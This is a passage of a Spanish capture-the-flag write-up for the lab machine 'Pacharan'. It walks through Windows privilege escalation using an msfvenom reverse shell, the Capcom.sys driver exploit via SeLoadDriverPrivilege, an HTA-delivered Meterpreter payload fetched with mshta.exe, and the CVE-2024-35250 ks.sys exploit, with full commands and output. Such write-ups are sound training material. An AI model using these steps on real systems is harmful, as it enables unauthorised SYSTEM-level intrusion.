+</span></span><span style="display:flex;"><span>remote: Total <span style="color:#ae81ff">20</span> <span style="color:#f92672">(</span>delta 5<span style="color:#f92672">)</span>, reused <span style="color:#ae81ff">16</span> <span style="color:#f92672">(</span>delta 4<span style="color:#f92672">)</span>, pack-reused <span style="color:#ae81ff">0</span> <span style="color:#f92672">(</span>from 0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Recibiendo objetos: 100% <span style="color:#f92672">(</span>20/20<span style="color:#f92672">)</span>, 270.13 KiB | 1.71 MiB/s, listo.
+</span></span><span style="display:flex;"><span>Resolviendo deltas: 100% <span style="color:#f92672">(</span>5/5<span style="color:#f92672">)</span>, listo.
+</span></span></code></pre></div><p>Ahora, debemos crear una <strong>Reverse Shell</strong> con <strong>msfvenom</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p windows/x64/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>Tu_IP LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> -f exe -o revShell.exe
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No arch selected, selecting arch: x64 from the payload
+</span></span><span style="display:flex;"><span>No encoder specified, outputting raw payload
+</span></span><span style="display:flex;"><span>Payload size: <span style="color:#ae81ff">460</span> bytes
+</span></span><span style="display:flex;"><span>Final size of exe file: <span style="color:#ae81ff">7168</span> bytes
+</span></span><span style="display:flex;"><span>Saved as: revShell.exe
+</span></span></code></pre></div><p>Con esto listo, vamos a cargar todos los archivos, que en total serían 4, a nuestra sesión de <strong>evil-winrm</strong> con el comando <strong>upload</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>*Evil-WinRM* PS C:\&gt; mkdir Temp
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\&gt; cd Temp
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Temp&gt; upload SeLoadDriverPrivilege-JoshMorrison99/LoadDriver.exe                                        
+</span></span><span style="display:flex;"><span>Info: Uploading /../TheHackersLabs/Pacharan/content/SeLoadDriverPrivilege-JoshMorrison99/LoadDriver.exe to C:\Temp\LoadDriver.exe
+</span></span><span style="display:flex;"><span>Data: 20480 bytes of 20480 bytes copied
+</span></span><span style="display:flex;"><span>Info: Upload successful!
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Temp&gt; upload SeLoadDriverPrivilege-JoshMorrison99/ExploitCapcom.exe
+</span></span><span style="display:flex;"><span>Info: Uploading /../TheHackersLabs/Pacharan/content/SeLoadDriverPrivilege-JoshMorrison99/ExploitCapcom.exe to C:\Temp\ExploitCapcom.exe
+</span></span><span style="display:flex;"><span>Data: 357716 bytes of 357716 bytes copied
+</span></span><span style="display:flex;"><span>Info: Upload successful!
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Temp&gt; upload SeLoadDriverPrivilege-JoshMorrison99/Capcom.sys
+</span></span><span style="display:flex;"><span>Info: Uploading /../TheHackersLabs/Pacharan/content/SeLoadDriverPrivilege-JoshMorrison99/Capcom.sys to C:\Temp\Capcom.sys
+</span></span><span style="display:flex;"><span>Data: 14100 bytes of 14100 bytes copied
+</span></span><span style="display:flex;"><span>Info: Upload successful!
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Temp&gt; upload revShell.exe
+</span></span><span style="display:flex;"><span>Info: Uploading /../TheHackersLabs/Pacharan/content/revShell.exe to C:\Temp\revShell.exe
+</span></span><span style="display:flex;"><span>Data: 9556 bytes of 9556 bytes copied
+</span></span><span style="display:flex;"><span>Info: Upload successful!
+</span></span></code></pre></div><p>De acuerdo a las instrucciones, debemos invocar el binario <strong>LoadDriver.exe</strong> junto al archivo <strong>Capcom.sys</strong> y el resultado nos debe dar <code>NTSTATUS: 00000000, WinError: 0</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Temp&gt; .\LoadDriver.exe System\CurrentControlSet\MyService C:\Temp\Capcom.sys
+</span></span><span style="display:flex;"><span>RegCreateKeyEx failed: 0x0
+</span></span><span style="display:flex;"><span>[+] Enabling SeLoadDriverPrivilege
+</span></span><span style="display:flex;"><span>[+] SeLoadDriverPrivilege Enabled
+</span></span><span style="display:flex;"><span>[+] Loading Driver: \Registry\User\S-1-5-21-3046175042-3013395696-775018414-1108\System\CurrentControlSet\MyService
+</span></span><span style="display:flex;"><span>NTSTATUS: 00000000, WinError: 0
+</span></span></code></pre></div><p>Parece que funciono.</p>
+<p>Vamos a abrir una <strong>netcat</strong> usando <strong>rlwrap</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rlwrap nc -nlvp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span></code></pre></div><p>Por último, ejecutamos el binario <strong>ExploitCapcom.exe</strong> indicándole que ejecute nuestra <strong>Reverse Shell</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Temp&gt; .\ExploitCapcom.exe C:\Temp\revShell.exe
+</span></span><span style="display:flex;"><span>[+] Path is: C:\Temp\revShell.exe
+</span></span><span style="display:flex;"><span>[*] Capcom.sys exploit
+</span></span><span style="display:flex;"><span>[*] Capcom.sys handle was obtained as 0000000000000080
+</span></span><span style="display:flex;"><span>[*] Shellcode was placed at 0000026AEFD30008
+</span></span><span style="display:flex;"><span>[+] Shellcode was executed
+</span></span><span style="display:flex;"><span>[+] Token stealing was successful
+</span></span><span style="display:flex;"><span>[+] The SYSTEM shell was launched
+</span></span><span style="display:flex;"><span>[*] Press any key to exit this program
+</span></span></code></pre></div><p>Veamos si recibimos algo en la <strong>netcat</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>rlwrap nc -nlvp 443
+</span></span><span style="display:flex;"><span>listening on [any] 443 ...
+</span></span><span style="display:flex;"><span>connect to [Tu_IP] from (UNKNOWN) [192.168.69.69] 60134
+</span></span><span style="display:flex;"><span>Microsoft Windows [Versi�n 10.0.14393]
+</span></span><span style="display:flex;"><span>(c) 2016 Microsoft Corporation. Todos los derechos reservados.
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>C:\Temp<span style="color:#75715e">&gt;whoami</span>
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>nt authority\system
+</span></span></code></pre></div><p>Fue un exito.</p>
+<p>Ya solo buscamos la flag del administrador:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>C:\Users\Administrador\Desktop<span style="color:#75715e">&gt;type root.txt</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">type</span> root.txt
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Con esto completamos la máquina.</p>
+<h3 id="EnumWin">Enumeración de Máquina Windows con Módulo de local_exploit_suggester de Metasploit y Escalando Privilegios con cve_2024_35250_ks_driver</h3>
+<p>Si nosotros quisiéramos utilizar el módulo <code>post/multi/recon/local_exploit_suggester</code> de <strong>Metasploit</strong>, necesitaríamos una sesión de <strong>Meterpreter</strong>.</p>
+<p>Para obtener esta sesión, necesitamos usar el módulo <strong>HTA Server</strong> que nos dará una URL que usaremos dentro de la sesión de <strong>evil-winrm</strong> junto al comando <strong>mshta.exe</strong>, pues este permite la ejecución de aplicaciones <strong>HTA</strong>.</p>
+<h4 id="HTA">Levantando Servidor HTA y Obteniendo Sesión de Meterpreter</h4>
+<p>Inicia <strong>Metasploit</strong> y usa el módulo <strong>HTA Server</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfconsole -q
+</span></span><span style="display:flex;"><span>msf6 &gt; use exploit/windows/misc/hta_server
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> No payload configured, defaulting to windows/meterpreter/reverse_tcp
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/misc/hta_server<span style="color:#f92672">)</span> &gt;
+</span></span></code></pre></div><p>Vamos a configurarlo para que acepte la <strong>arquitectura x64 de Windows</strong> y le configuramos nuestra IP:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/misc/hta_server<span style="color:#f92672">)</span> &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp
+</span></span><span style="display:flex;"><span>PAYLOAD <span style="color:#f92672">=</span>&gt; windows/x64/meterpreter/reverse_tcp
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/misc/hta_server<span style="color:#f92672">)</span> &gt; set target <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>target <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/local/bypassuac_comhijack<span style="color:#f92672">)</span> &gt; set LHOST Tu_IP
+</span></span><span style="display:flex;"><span>LHOST <span style="color:#f92672">=</span>&gt; Tu_IP
+</span></span></code></pre></div><p>Lo ejecutamos y copiamos la URL:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/misc/hta_server<span style="color:#f92672">)</span> &gt; exploit
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Exploit running as background job 1.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Exploit completed, but no session was created.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on Tu_IP:4444 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using URL: http://Tu_IP:8080/nkP4w3.hta
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Server started.
+</span></span></code></pre></div><p>Ahora, en la sesión de <strong>evil-winrm</strong>, usamos el comando <strong>mshta.exe</strong> y le agregamos la URL:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\C</span>hivas Regal<span style="color:#ae81ff">\D</span>ocuments&gt; mshta.exe http://Tu_IP:8080/nkP4w3.hta
+</span></span></code></pre></div><p>Si revisas <strong>Metasploit</strong>, verás que ya tienes una sesión de <strong>Meterpreter</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/misc/hta_server<span style="color:#f92672">)</span> &gt; 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.69.69    hta_server - Delivering Payload
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">203846</span> bytes<span style="color:#f92672">)</span> to 192.168.69.69
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>Tu_IP:4444 -&gt; 192.168.69.69:49776<span style="color:#f92672">)</span> at 2025-02-25 02:13:55 -0600
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/misc/hta_server<span style="color:#f92672">)</span> &gt; sessions
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Active sessions
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  Id  Name  Type                     Information                              Connection
+</span></span><span style="display:flex;"><span>  --  ----  ----                     -----------                              ----------
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">1</span>         meterpreter x64/windows  PACHARAN<span style="color:#ae81ff">\C</span>hivas Regal @ WIN-VRU3GG3DPLJ  Tu_IP:4444 -&gt; 192.168.69.69:49776 <span style="color:#f92672">(</span>192.168.69.69<span style="color:#f92672">)</span>
+</span></span></code></pre></div><h4 id="Suggester">Utilizando Módulo local_exploit_suggester y Probando Exploit cve_2024_35250_ks_driver</h4>
+<p>Vamos a usar el módulo <code>post/multi/recon/local_exploit_suggester</code> para obtener una lista de Exploits que nos puedan ayudar a escalar privilegios:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/misc/hta_server<span style="color:#f92672">)</span> &gt; use post/multi/recon/local_exploit_suggester
+</span></span><span style="display:flex;"><span>msf6 post<span style="color:#f92672">(</span>multi/recon/local_exploit_suggester<span style="color:#f92672">)</span> &gt; set SESSION <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>SESSION <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>msf6 post<span style="color:#f92672">(</span>multi/recon/local_exploit_suggester<span style="color:#f92672">)</span> &gt; exploit
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.69.69 - Collecting local exploits <span style="color:#66d9ef">for</span> x64/windows...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.69.69 - <span style="color:#ae81ff">203</span> exploit checks are being tried...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#   Name                                                           Potentially Vulnerable?  Check Result</span>
+</span></span><span style="display:flex;"><span> -   ----                                                           -----------------------  ------------
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">1</span>   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">2</span>   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">3</span>   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">4</span>   exploit/windows/local/bypassuac_sdclt                          Yes                      The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">5</span>   exploit/windows/local/bypassuac_sluihijack                     Yes                      The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">6</span>   exploit/windows/local/cve_2019_1458_wizardopium                Yes                      The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">7</span>   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The target appears to be vulnerable. Vulnerable Windows <span style="color:#ae81ff">10</span> v1607 build detected!
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">8</span>   exploit/windows/local/cve_2020_1048_printerdemon               Yes                      The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">9</span>   exploit/windows/local/cve_2020_1337_printerdemon               Yes                      The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">10</span>  exploit/windows/local/cve_2021_40449                           Yes                      The target appears to be vulnerable. Vulnerable Windows <span style="color:#ae81ff">10</span> v1607 build detected!
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">11</span>  exploit/windows/local/cve_2022_21999_spoolfool_privesc         Yes                      The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">12</span>  exploit/windows/local/cve_2024_30088_authz_basep               Yes                      The target appears to be vulnerable. Version detected: Windows Server <span style="color:#ae81ff">2016</span>
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">13</span>  exploit/windows/local/cve_2024_35250_ks_driver                 Yes                      The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows Server <span style="color:#ae81ff">2016</span>
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">14</span>  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">15</span>  exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.
+</span></span></code></pre></div><p>Salieron varios Exploits, pero el que nos va a servir será <code>exploit/windows/local/cve_2024_35250_ks_driver</code>.</p>
+<p>Este Exploit se aprovecha del driver ks.sys que es un componente del <strong>Kernel Streaming (KS)</strong> y se encuentra instalado por defecto en <strong>Windows 10</strong>. Este Exploit pertenece al <strong>CVE-2024-35250</strong>.</p>
+<p>Vamos a usarlo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 post<span style="color:#f92672">(</span>multi/recon/local_exploit_suggester<span style="color:#f92672">)</span> &gt; use exploit/windows/local/cve_2024_35250_ks_driver
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using configured payload windows/x64/meterpreter/reverse_tcp
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/local/cve_2024_35250_ks_driver<span style="color:#f92672">)</span> &gt;
+</span></span></code></pre></div><p>Lo configuramos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/local/cve_2024_35250_ks_driver<span style="color:#f92672">)</span> &gt; set LPORT <span style="color:#ae81ff">5555</span>
+</span></span><span style="display:flex;"><span>LPORT <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">5555</span>
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/local/cve_2024_35250_ks_driver<span style="color:#f92672">)</span> &gt; set SESSION <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>SESSION <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/local/cve_2024_35250_ks_driver<span style="color:#f92672">)</span> &gt; set LHOST Tu_IP
+</span></span><span style="display:flex;"><span>LHOST <span style="color:#f92672">=</span>&gt; Tu_IP
+</span></span></code></pre></div><p>Y lo ejecutamos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/local/cve_2024_35250_ks_driver<span style="color:#f92672">)</span> &gt; exploit
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on Tu_IP:5555 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running automatic check <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;set AutoCheck false&#34;</span> to disable<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows Server <span style="color:#ae81ff">2016</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Launching notepad to host the exploit...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> The notepad path is: C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\n</span>otepad.exe
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> The notepad pid is: <span style="color:#ae81ff">732</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Reflectively injecting the DLL into 732...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">203846</span> bytes<span style="color:#f92672">)</span> to 192.168.69.69
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">4</span> opened <span style="color:#f92672">(</span>Tu_IP:5555 -&gt; 192.168.69.69:49820<span style="color:#f92672">)</span> at 2025-02-25 02:27:20 -0600
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; getuid
+</span></span><span style="display:flex;"><span>Server username: NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM
+</span></span></code></pre></div><p>Listo, volvimos a escalar privilegios.</p>
+
+
+    
+    <h2 id="links-de-investigacion">Links de investigación</h2>
+    <ul>
+      <li><a href="https://github.com/ropnop/kerbrute" target="_blank" rel="noopener noreferrer">https://github.com/ropnop/kerbrute</a></li><li><a href="https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html?highlight=SeLoadDriverPrivilege#seloaddriverprivilege" target="_blank" rel="noopener noreferrer">https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html?highlight=SeLoadDriverPrivilege#seloaddriverprivilege</a></li><li><a href="https://github.com/JoshMorrison99/SeLoadDriverPrivilege?tab=readme-ov-file" target="_blank" rel="noopener noreferrer">https://github.com/JoshMorrison99/SeLoadDriverPrivilege?tab=readme-ov-file</a></li><li><a href="https://github.com/k4sth4/SeLoadDriverPrivilege" target="_blank" rel="noopener noreferrer">https://github.com/k4sth4/SeLoadDriverPrivilege</a></li><li><a href="https://www.tarlogic.com/es/blog/explotacion-seloaddriverprivilege/" target="_blank" rel="noopener noreferrer">https://www.tarlogic.com/es/blog/explotacion-seloaddriverprivilege/</a></li>
+    </ul>
+    
+  </div>
+
+  
+
+
+  
+
+  
+
+
+
+
+
+
+
+
+
+
+<nav class="post-nav">
+  
+  <a class="post-nav-link post-nav-prev" href="http://localhost:1313/THL-writeup-cyberpunk/">
+    <span class="post-nav-label">← Anterior</span>
+    <span class="post-nav-title">Cyberpunk - TheHackerLabs</span>
+  </a>
+  
+  
+  <a class="post-nav-link post-nav-next" href="http://localhost:1313/THL-writeup-academy/">
+    <span class="post-nav-label">Siguiente →</span>
+    <span class="post-nav-title">Academy - TheHackerLabs</span>
+  </a>
+  
+</nav>
+
+
+
+</article>
+
+  </main>
+  <footer class="site-footer">
+  <div class="wrap">
+    <p>&copy; 2026 BerserkWings · México
+       · <a href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">GitHub</a>
+    </p>
+  </div>
+</footer>
+
+  
+
+
+<a href="#indice" class="back-to-top" id="backToTop" aria-label="Volver al índice">&uarr;</a>
+
+
+<script src="/js/main.min.15ff80349759f71df793ae28568ef0a6a9c3eb6efe99c9e96bad1d9236a26c31.js" integrity="sha256-Ff&#43;ANJdZ9x33k64oVo7wpqnD627&#43;mcnpa60dkjaibDE=" defer></script>
+
+</body>
+</html>
